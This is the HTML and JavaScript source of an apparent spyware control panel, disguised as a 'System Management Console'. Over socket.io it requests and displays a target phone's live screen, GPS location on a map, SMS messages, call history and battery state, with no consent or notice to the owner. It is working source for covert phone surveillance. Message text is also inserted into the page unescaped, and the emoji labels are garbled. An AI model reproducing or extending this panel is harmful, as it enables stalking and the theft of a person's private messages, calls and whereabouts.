<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Management Console</title>
    <script src="/socket.io/socket.io.js"></script>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    
    <style>
        :root { --sidebar-bg: #2c3e50; --accent: #1abc9c; --dark: #34495e; --text-light: #7f8c8d; }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; background: #f4f7f6; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 250px; background: var(--sidebar-bg); color: white; height: 100vh; position: fixed; z-index: 10; }
        .sidebar-header { padding: 20px; background: var(--accent); font-weight: bold; font-size: 1.1rem; }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #3e4f5f; transition: 0.3s; }
        .nav-item:hover, .nav-item.active { background: #1a252f; color: var(--accent); }

        /* Main Layout */
        .main-content { margin-left: 250px; flex: 1; display: flex; flex-direction: column; height: 100vh; }
        .top-nav { height: 85px; background: white; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); flex-shrink: 0; }
        
        .status-pill { padding: 6px 12px; border-radius: 20px; font-weight: bold; background: #fadbd8; color: #7b241c; display: flex; align-items: center; gap: 5px; }
        
        /* Views */
        .view { display: none; padding: 25px; overflow-y: auto; flex: 1; }
        .view.active { display: block; }
        
        /* Mirroring Window */
        .mirror-wrapper { 
            position: relative; 
            width: 100%; 
            max-width: 800px; 
            height: 500px; 
            background: #1a1a1a; 
            border-radius: 12px; 
            margin: 20px 0; 
            border: 5px solid var(--dark);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        #screen-img { height: 100%; width: auto; display: none; }
        .overlay { 
            position: absolute; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; flex-direction: column; 
            align-items: center; justify-content: center; 
            color: white; z-index: 5; 
        }

        /* Buttons */
        .btn { padding: 10px 20px; border-radius: 5px; border: none; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn-start { background: var(--accent); color: white; }
        .btn-stop { background: #e74c3c; color: white; display: none; }

        /* Tables */
        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; margin-top: 15px; }
        th { background: var(--dark); color: white; padding: 15px; text-align: left; }
        td { padding: 15px; border-bottom: 1px solid #eee; }
        #map { height: 300px; width: 100%; border-radius: 12px; border: 1px solid #ddd; margin-top: 20px; }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="sidebar-header">SYSTEM CONTROL</div>
    <div class="nav-item active" id="nav-dash" onclick="showView('dash')">üìä Dashboard</div>
    <div class="nav-item" id="nav-sms" onclick="showView('sms')">üí¨ SMS Messages</div>
    <div class="nav-item" id="nav-calls" onclick="showView('calls')">üìû Call History</div>
</div>

<div class="main-content">
    <div class="top-nav">
        <div>
            <p id="addr-text" style="margin:0; font-weight:600;">üìç GPS: Waiting for signal...</p>
            <button onclick="socket.emit('get-gps-request')" style="font-size: 11px; cursor: pointer;">Force GPS Update</button>
        </div>
        <div class="battery-box" style="display:flex; align-items:center; gap:10px;">
            <div id="status-container" class="status-pill">
                <span id="bolt" style="display:none;">‚ö°</span> <span id="pct">--</span>%
            </div>
            <span style="font-size: 1.5rem;">üîã</span>
        </div>
    </div>

    <div id="dash" class="view active">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <h2>Live Screen Mirroring</h2>
            <div>
                <button id="btn-start" class="btn btn-start" onclick="toggleScreen(true)">‚ñ∂ Start Screen View</button>
                <button id="btn-stop" class="btn btn-stop" onclick="toggleScreen(false)">‚èπ Stop Mirroring</button>
            </div>
        </div>

        <div class="mirror-wrapper">
            <div id="screen-overlay" class="overlay">
                <p id="overlay-msg" style="font-size:1.2rem;">Stream is currently inactive</p>
                <button class="btn btn-start" onclick="toggleScreen(true)">Connect Now</button>
            </div>
            <img id="screen-img" src="" alt="Live Stream" />
        </div>

        <h3>Device Location</h3>
        <div id="map"></div>
    </div>

    <div id="sms" class="view">
        <h2>Recent Messages</h2>
        <table>
            <thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Time</th></tr></thead>
            <tbody id="sms-table"></tbody>
        </table>
    </div>

    <div id="calls" class="view">
        <h2>Call History</h2>
        <table>
            <thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Time</th></tr></thead>
            <tbody id="calls-table"></tbody>
        </table>
    </div>
</div>

<script>
    const socket = io();
    let map, marker, circle;

    // --- Screen Mirroring Logic ---
    function toggleScreen(start) {
        if (start) {
            socket.emit('request-screen-view');
            document.getElementById('overlay-msg').innerText = "üîÑ Requesting access...";
        } else {
            socket.emit('stop-mirroring');
            resetScreenUI("Mirroring Stopped");
        }
    }

    socket.on('screen-status', (status) => {
        if (status === "OFF") {
            alert("ALERT: The target mobile screen is currently OFF. Cannot start mirroring.");
            resetScreenUI("‚ö†Ô∏è Screen is OFF");
        }
    });

    socket.on('ui-screen-stream', (base64) => {
        const img = document.getElementById('screen-img');
        document.getElementById('screen-overlay').style.display = 'none';
        document.getElementById('btn-start').style.display = 'none';
        document.getElementById('btn-stop').style.display = 'block';
        img.style.display = 'block';
        img.src = "data:image/jpeg;base64," + base64;
    });

    function resetScreenUI(msg) {
        document.getElementById('screen-img').style.display = 'none';
        document.getElementById('screen-overlay').style.display = 'flex';
        document.getElementById('btn-start').style.display = 'block';
        document.getElementById('btn-stop').style.display = 'none';
        document.getElementById('overlay-msg').innerText = msg;
    }

    // --- Tab Switching ---
    function showView(id) {
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        document.getElementById('nav-' + id).classList.add('active');

        if(id === 'sms') socket.emit('get-sms-request');
        if(id === 'calls') socket.emit('get-calls-request');
        if(id === 'dash' && map) setTimeout(() => map.invalidateSize(), 200);
    }

    // --- GPS & Map ---
    socket.on('ui-gps', (data) => {
        document.getElementById('addr-text').innerText = "üìç " + (data.address || "Location Found");
        if (!map) {
            map = L.map('map').setView([data.lat, data.lng], 16);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        }
        if (marker) map.removeLayer(marker);
        if (circle) map.removeLayer(circle);

        circle = L.circle([data.lat, data.lng], { radius: data.accuracy || 50, color: '#3498db', fillOpacity: 0.2 }).addTo(map);
        marker = L.circleMarker([data.lat, data.lng], { radius: 8, color: '#fff', fillColor: '#3498db', fillOpacity: 1 }).addTo(map);
        map.setView([data.lat, data.lng], 16);
    });

    // --- Battery & Logs ---
    socket.on('ui-battery', (data) => {
        document.getElementById('pct').innerText = data.percent;
        const container = document.getElementById('status-container');
        container.style.background = "#d4efdf";
        container.style.color = "#145a32";
        document.getElementById('bolt').style.display = data.charging ? "inline" : "none";
    });

    socket.on('ui-sms-display', (data) => {
        document.getElementById('sms-table').innerHTML = data.map(m => `
            <tr><td class="${m.type}">${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>
        `).join('');
    });

    socket.on('ui-calls-display', (data) => {
        document.getElementById('calls-table').innerHTML = data.map(c => `
            <tr><td class="${c.type}">${c.type}</td><td>${c.name || 'Unknown'}</td><td>${c.number}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>
        `).join('');
    });

    socket.on('device-status', (s) => {
        if(!s.online) {
            document.getElementById('status-container').style.background = "#fadbd8";
            document.getElementById('addr-text').innerText = "‚ùå Device Disconnected";
        }
    });

    window.onload = () => { if(document.getElementById('map')) showView('dash'); };
</script>
</body>
</html>
